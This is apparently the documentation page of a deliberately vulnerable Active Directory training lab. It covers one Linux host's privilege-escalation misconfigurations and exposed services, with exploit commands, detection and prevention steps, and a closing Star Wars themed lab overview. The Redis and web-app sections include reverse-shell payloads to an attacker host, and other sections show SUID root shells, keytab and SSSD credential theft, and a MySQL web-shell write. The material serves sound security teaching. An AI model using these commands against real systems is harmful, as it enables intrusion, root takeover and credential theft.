# mandalore.empire.local — 10.10.0.15

Linux member server in EMPIRE (Ubuntu 22.04 Cloud Member). This host represents a Linux-in-AD domain member (joined to `empire.local` via realmd/sssd/adcli). It is configured with multiple local privilege escalation (LPE) paths, Active Directory integration misconfigurations (B1 to B8), and exposed unauthenticated network services (Redis, MongoDB, Memcached, MySQL, and a vulnerable Python WebApp).

## Listening ports

| Port | Proto | Service | Notes |
|---|---|---|---|
| 22 | TCP | SSH | Password authentication enabled, weak credentials target, poisonable authorized_keys |
| 2049 | TCP | NFS | NFS server with export `/srv/nfs/empire` configured with `no_root_squash` |
| 3306 | TCP | MySQL (MariaDB) | Root password is `root`, accessible from any host, `secure_file_priv` is empty |
| 5000 | TCP | Python WebApp | Schrute Logistics portal (runs as root), command injection and unrestricted file upload |
| 6379 | TCP | Redis | Unauthenticated access, protected mode disabled, bind on all interfaces |
| 11211 | TCP | Memcached | Unauthenticated access, bind on all interfaces |
| 27017 | TCP | MongoDB | Unauthenticated access, bind on all interfaces |

## Local LPE & Linux-in-AD Primitives

| Vector | File / Path / Detail |
|---|---|
| **B1: World-readable host keytab** | `/etc/krb5.keytab` (mode `0644`) |
| **B2: AD group -> passwordless sudo** | `/etc/sudoers.d/empire-ad` (Domain Users get NOPASSWD) |
| **B3: SSSD credential cache made readable** | `/var/lib/sss/db/` (mode `0755` / `0644`) |
| **B4: Cron job runs world-writable script** | `/opt/empire/backup.sh` (mode `0777`) executed by root cron |
| **B5: SUID-root GTFOBins binary** | `/usr/local/bin/find-suid` (mode `4755`) |
| **B6: Plaintext AD credentials in files** | `/home/labadmin/.creds.txt` and `.bash_history` |
| **B7: NFS export with no_root_squash** | `/srv/nfs/empire` exported with `no_root_squash` |
| **B8: Weak SSH configuration** | Password auth enabled, user `michael`/`Scranton2024!`, world-writable `authorized_keys` |

---

## Linux-in-AD & Local Privilege Escalation (B1 - B8)

### B1: World-Readable Host Keytab (`krb5.keytab`)
* **Explanation**: The host Kerberos keytab file `/etc/krb5.keytab` contains service keys derived from the computer account password (`mandalore$`). The system uses this to authenticate to the Domain Controller. By default, it must only be readable by root. Because its permissions are set to world-readable (`0644`), any low-privilege local user can read it. This allows an attacker to extract the computer account's Kerberos keys/hashes, authenticate to the DC as the computer account, and execute S4U2self/S4U2proxy delegation attacks to impersonate domain administrators or generate a Silver Ticket.
* **Exploit Commands**:
  ```bash
  # Check keytab file permissions
  ls -la /etc/krb5.keytab

  # List keytab entries and SPNs
  klist -kt /etc/krb5.keytab

  # Authenticate as the machine account using the keytab
  kinit -kt /etc/krb5.keytab 'mandalore$@EMPIRE.LOCAL'

  # Verify ticket cache
  klist
  ```
* **Detection & Prevention**:
  * **Detection**: Regularly audit file permissions of `/etc/krb5.keytab` to ensure it is restricted to root only. Use `auditd` to monitor read access to the file.
  * **Prevention**: Restrict access to root only:
    ```bash
    chown root:root /etc/krb5.keytab
    chmod 600 /etc/krb5.keytab
    ```

### B2: AD Group with Passwordless Sudo (EMPIRE\Domain Users -> root)
* **Explanation**: The file `/etc/sudoers.d/empire-ad` is configured to grant passwordless `sudo` privileges to members of the `EMPIRE\Domain Users` Active Directory group. Since all Active Directory domain accounts are members of `Domain Users` by default, any domain user logging into Mandalore can immediately escalate privileges to `root` via `sudo` without entering a password.
* **Exploit Commands**:
  ```bash
  # Check sudo permissions
  sudo -l

  # Elevate directly to root
  sudo -i
  ```
* **Detection & Prevention**:
  * **Detection**: Check `/etc/sudoers` and configuration files in `/etc/sudoers.d/` for rules granting administrative privileges to broad AD groups.
  * **Prevention**: Restrict `sudo` access to specific security groups instead of the broad `Domain Users` group:
    ```bash
    # Secure rule in /etc/sudoers.d/empire-ad
    %domain\ admins@empire.local ALL=(ALL) ALL
    ```

### B3: World-Readable SSSD Credential Cache (SSSD Cache Leak)
* **Explanation**: SSSD caches Kerberos credentials, tickets, and user passwords in database files under `/var/lib/sss/db/`. The directory and files have been made world-readable (`chmod -R a+r /var/lib/sss/db`). Any local user can read the SSSD database files, extract cached SHA-512 crypt hashes of users' passwords, or copy Kerberos ticket caches (ccache) to impersonate users on the domain offline.
* **Exploit Commands**:
  ```bash
  # View files in SSSD database directory
  ls -la /var/lib/sss/db/

  # Copy the cached LDB database
  cp /var/lib/sss/db/cache_empire.local.ldb /tmp/

  # Parse the LDB database to extract hashes using a script (e.g., ssssecretextractor)
  python3 ssssecretextractor.py -f /tmp/cache_empire.local.ldb
  ```
* **Detection & Prevention**:
  * **Detection**: Audit folder permissions of `/var/lib/sss/db/`.
  * **Prevention**: Set secure directory permissions so that only the root user can access SSSD databases:
    ```bash
    chown -R root:root /var/lib/sss/db/
    chmod 700 /var/lib/sss/db/
    chmod 600 /var/lib/sss/db/*
    ```

### B4: Root Cron Job Running World-Writable Script (`backup.sh`)
* **Explanation**: A root cron job executes `/opt/empire/backup.sh` every minute. Because the script is world-writable (mode `0777`), any local user can append arbitrary commands to the file. When the cron job executes, the appended commands will be run under the security context of the `root` user.
* **Exploit Commands**:
  ```bash
  # Verify that the backup script is world-writable
  ls -la /opt/empire/backup.sh

  # Append payload command to create a Setuid copy of bash
  echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /opt/empire/backup.sh

  # Wait 60 seconds for the cron job to run, then execute the SUID shell
  /tmp/rootbash -p
  ```
* **Detection & Prevention**:
  * **Detection**: Find system scripts run by root cron jobs that have writable permissions for non-root users.
  * **Prevention**: Secure the script ownership and permissions:
    ```bash
    chown root:root /opt/empire/backup.sh
    chmod 700 /opt/empire/backup.sh
    ```

### B5: SUID-Root Copy of Find Binary (`find-suid`)
* **Explanation**: A copy of the `find` binary has been placed at `/usr/local/bin/find-suid` with the Setuid (SUID) flag set (`4755`) and owned by `root`. The `find` utility allows executing arbitrary commands using the `-exec` option. Because the SUID bit is set, executing this copy allows running arbitrary commands as the `root` user.
* **Exploit Commands**:
  ```bash
  # Run shell commands as root using the SUID find copy
  /usr/local/bin/find-suid . -exec /bin/sh -p \; -quit
  ```
* **Detection & Prevention**:
  * **Detection**: Monitor for non-standard SUID binaries using security scanning tools or run:
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    ```
  * **Prevention**: Avoid assigning the SUID flag to administrative utilities. Remove the SUID bit:
    ```bash
    chmod u-s /usr/local/bin/find-suid
    ```

### B6: Leaked Domain Plaintext Credentials (`.creds.txt` & Bash History)
* **Explanation**: Active Directory credentials for the service account `svc_r2d2` (`Droid2024!`) are stored in `/home/labadmin/.creds.txt` and are also leaked inside `/home/labadmin/.bash_history`. Since `.creds.txt` is world-readable (`0644`), any local user can read the file to obtain domain credentials and pivot to the Windows domain controller or member servers.
* **Exploit Commands**:
  ```bash
  # Read leaked credentials file
  cat /home/labadmin/.creds.txt

  # Read leaked credentials from bash history
  cat /home/labadmin/.bash_history

  # Verify domain access using netexec
  nxc smb 10.10.0.10 -u 'svc_r2d2' -p 'Droid2024!'
  ```
* **Detection & Prevention**:
  * **Detection**: Use automated scanners to locate configuration files containing secrets in home folders and check history configuration settings.
  * **Prevention**: Implement a credential vault and instruct users/administrators not to write passwords in plaintext files. Restrict bash history permissions:
    ```bash
    chmod 600 /home/labadmin/.bash_history
    ```

### B7: NFS Export Configured with `no_root_squash`
* **Explanation**: The directory `/srv/nfs/empire` is exported with the `no_root_squash` configuration option. When a remote client mounts the NFS share as the `root` user, the server retains the client's root privileges rather than squashing them to the unprivileged `nobody` user. An attacker with root control on a remote machine can mount the share, write an SUID-root binary to it, and execute it locally on Mandalore to escalate privileges.
* **Exploit Commands**:
  From the remote attacker machine (running as root):
  ```bash
  # Mount NFS export
  mkdir /tmp/nfs_exploit
  mount -t nfs 10.10.0.15:/srv/nfs/empire /tmp/nfs_exploit

  # Write shell binary and set SUID bit
  cp /bin/bash /tmp/nfs_exploit/shell
  chmod 4755 /tmp/nfs_exploit/shell
  umount /tmp/nfs_exploit
  ```
  On the target Mandalore machine (as low-privilege user):
  ```bash
  # Execute the SUID binary
  /srv/nfs/empire/shell -p
  ```
* **Detection & Prevention**:
  * **Detection**: Audit the `/etc/exports` file on the server.
  * **Prevention**: Enforce privilege squashing by changing the configuration option in `/etc/exports` to `root_squash`:
    ```bash
    /srv/nfs/empire *(rw,sync,root_squash,no_subtree_check,insecure)
    ```

### B8: Weak SSH Configuration (Password Auth, Weak User, Poisonable Authorized Keys)
* **Explanation**: The SSH server is configured with password authentication enabled (`PasswordAuthentication yes`) and root login allowed (`PermitRootLogin yes`). Additionally, a weak user `michael` has the password `Scranton2024!`. The directory `/home/michael/.ssh/` (mode `0777`) and `/home/michael/.ssh/authorized_keys` (mode `0666`) are world-writable, allowing any local attacker to append their own SSH public key to log in without a password.
* **Exploit Commands**:
  From a remote machine:
  ```bash
  # Log in using the weak password
  ssh michael@10.10.0.15
  # (Password: Scranton2024!)
  ```
  From a local user:
  ```bash
  # Append your public key to michael's authorized_keys
  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... attacker" >> /home/michael/.ssh/authorized_keys

  # Connect to SSH as michael using your private key
  ssh michael@localhost -i /path/to/private_key
  ```
* **Detection & Prevention**:
  * **Detection**: Periodically check SSH service settings and verify permissions on all users' `.ssh` folders and `authorized_keys` files.
  * **Prevention**: Set secure directory permissions and restrict password authentication:
    ```bash
    chmod 700 /home/michael/.ssh
    chmod 600 /home/michael/.ssh/authorized_keys
    ```
    In `/etc/ssh/sshd_config`:
    ```ini
    PasswordAuthentication no
    PermitRootLogin no
    ```

---

## Exposed Services & Vulnerabilities

### Redis Service (Unauthenticated Remote Code Execution)
* **Explanation**: The Redis database server is exposed on port 6379 on all network interfaces (`bind 0.0.0.0`) without password authentication (`requirepass` is disabled) and with `protected-mode no`. An attacker can connect remotely to Redis, query and modify keys, and perform administrative actions. Since Redis has access to the filesystem, an attacker can modify the Redis database directory (`dir`) and database filename (`dbfilename`) to write a malicious cron job or an SSH public key, resulting in Remote Code Execution (RCE).
* **Exploit Commands**:
  ```bash
  # Connect remotely to Redis
  redis-cli -h 10.10.0.15

  # Overwrite the root cron tab to establish a reverse shell
  10.10.0.15:6379> config set dir /var/spool/cron/crontabs/
  10.10.0.15:6379> config set dbfilename root
  10.10.0.15:6379> set payload "\n\n* * * * * bash -c 'bash -i >& /dev/tcp/10.10.0.1/4444 0>&1'\n\n"
  10.10.0.15:6379> save
  ```
* **Detection & Prevention**:
  * **Detection**: Check if port 6379 is open to the network. Scan for unauthenticated Redis connections.
  * **Prevention**: Bind Redis only to localhost, enable `protected-mode yes`, and set a strong authentication password:
    ```ini
    # /etc/redis/redis.conf
    bind 127.0.0.1
    protected-mode yes
    requirepass StrongPassword123!
    ```

### MongoDB Service (Unauthenticated Database Access)
* **Explanation**: MongoDB is exposed on port 27017 across all interfaces (`0.0.0.0`) and has no authentication or authorization enabled. Any remote user can connect to the database anonymously, extract database tables, and modify records.
* **Exploit Commands**:
  ```bash
  # Connect anonymously using mongosh
  mongosh --host 10.10.0.15 --port 27017

  # List databases and query collections
  show dbs
  use empire
  show collections
  db.flags.find()
  ```
* **Detection & Prevention**:
  * **Detection**: Monitor port 27017 for network exposure. Check database query logs for unauthorized or anonymous connections.
  * **Prevention**: Bind MongoDB to `127.0.0.1` and enable user authorization:
    ```yaml
    # /etc/mongodb.conf
    bind_ip = 127.0.0.1
    security:
      authorization: enabled
    ```

### Memcached Service (Unauthenticated Cache Exposure)
* **Explanation**: The Memcached memory cache is running on port 11211 and is bound to all network interfaces (`-l 0.0.0.0`) without authentication. An attacker can connect remotely, inspect statistical information, enumerate cached slab keys, and extract cached sensitive application data.
* **Exploit Commands**:
  ```bash
  # Query Memcached statistics and item keys using telnet or netcat
  nc -vn 10.10.0.15 11211

  # Dump items
  stats
  stats items
  stats cachedump 1 100
  get <item_key>
  ```
* **Detection & Prevention**:
  * **Detection**: Run network port scans to identify exposed port 11211.
  * **Prevention**: Restrict the service to the local loopback interface inside `/etc/memcached.conf`:
    ```conf
    -l 127.0.0.1
    ```

### MySQL/MariaDB Service (Weak Credentials & Remote Privileged Access)
* **Explanation**: The MariaDB service listens on port 3306 on all network interfaces (`0.0.0.0`). The `root` account has the weak password `root` and is allowed to connect from any remote host (`root@%`). Additionally, the `secure_file_priv` parameter is set to empty (`secure_file_priv = `), which allows reading and writing system files using standard SQL injection commands. An attacker can read sensitive system configurations or perform User-Defined Function (UDF) injection to execute OS commands.
* **Exploit Commands**:
  ```bash
  # Log in remotely as root
  mysql -u root -p'root' -h 10.10.0.15

  # Read files from the filesystem
  SELECT LOAD_FILE('/etc/passwd');

  # Write file to the system (e.g. into a web directory)
  SELECT 'payload_code' INTO OUTFILE '/var/www/html/shell.php';
  ```
* **Detection & Prevention**:
  * **Detection**: Audit database users and remote host access privileges.
  * **Prevention**: Restrict the `root` account to localhost, set a strong password, and restrict `secure_file_priv` in the configuration:
    ```sql
    # Enforce secure password and hosts in SQL:
    ALTER USER 'root'@'%' IDENTIFIED BY 'StrongPassword123!';
    ```
    In `/etc/mysql/mariadb.conf.d/`:
    ```ini
    bind-address = 127.0.0.1
    secure_file_priv = NULL
    ```

### WebApp Python RCE (Schrute Logistics Portal RCE & Upload)
* **Explanation**: A custom Python web application (Schrute Logistics Portal) runs on port 5000 (`0.0.0.0:5000`) under the `root` user context. The application contains two severe vulnerabilities:
  1. **OS Command Injection**: The `/ping` endpoint accepts a `host` query parameter and passes it directly to a shell: `subprocess.run("ping -c1 " + host, shell=True)`. An attacker can append shell operators (like `;`) to execute arbitrary shell commands.
  2. **Unrestricted File Upload**: The `/upload` endpoint allows uploading any file type to the `./uploads` directory without extension or content validation.
* **Exploit Commands**:
  ```bash
  # Execute commands using command injection on the ping endpoint
  curl "http://10.10.0.15:5000/ping?host=127.0.0.1;id;whoami"

  # Establish a reverse shell
  curl -G --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/10.10.0.1/4444 0>&1'" "http://10.10.0.15:5000/ping"

  # Upload a web shell/malicious file using the upload endpoint
  curl -X POST -F "file=@shell.sh" http://10.10.0.15:5000/upload
  ```
* **Detection & Prevention**:
  * **Detection**: Verify processes running python web applications on port 5000. Inspect server command execution logs.
  * **Prevention**:
    - Avoid passing raw user input to `shell=True` in subprocesses. Use parameter arrays:
      ```python
      subprocess.run(["ping", "-c1", host], capture_output=True)
      ```
    - Implement strict file whitelisting and store uploaded files in a directory that prohibits script execution.
    - Run the application process using a low-privilege service account instead of `root`.

---

## Minimum enum sweep

```bash
M=10.10.0.15

# 1. Port scan for exposed services
nmap -p 22,2049,3306,5000,6379,11211,27017 -sV -Pn $M

# 2. Check NFS exports
showmount -e $M

# 3. Test Redis unauthenticated access
redis-cli -h $M ping
redis-cli -h $M info

# 4. Test MongoDB unauthenticated access
mongosh --host $M --port 27017 --eval "db.adminCommand('listDatabases')"

# 5. Check Memcached access
nc -vn $M 11211 <<< "stats"

# 6. Check MySQL access with weak credentials
mysql -u root -p'root' -h $M -e "SHOW VARIABLES LIKE 'secure_file_priv';"

# 7. Test WebApp ping endpoint command injection
curl "http://$M:5000/ping?host=127.0.0.1;id"

# 8. Test SSH login
ssh michael@$M
```

## Forward to

- **LPE-001**: Local Linux Privilege Escalation (B1 - B8).
- **LAT-011**: Pivoting from Linux to Windows Active Directory (using stolen `svc_r2d2` credentials or `mandalore$` host keytab).

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
